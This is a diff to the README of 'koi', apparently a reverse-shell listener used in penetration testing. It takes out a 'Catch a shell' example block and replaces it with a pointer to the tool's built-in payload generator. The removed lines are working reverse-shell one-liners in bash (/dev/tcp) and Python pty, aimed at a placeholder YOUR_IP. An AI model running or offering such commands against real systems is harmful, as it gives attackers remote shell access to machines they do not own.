@@ -60,16 +60,7 @@ koi -p 9001
 
 ### Catch a shell
 
-Send a reverse shell from your target. Examples:
-
-```bash
-# bash
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-
-# Python PTY
-python3 -c "import os,pty,socket;s=socket.socket();s.connect(('YOUR_IP',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"
-```
-But juste type `payloads *interface*` to get pregenerated payloads ;)
+Send a reverse shell yourself or by typing `payloads *interface*` to get pregenerated payloads. do note that it needs to be a terminal like shell, as Koi is manipulating linux shs, powershells and cmd.
 
 ---
 
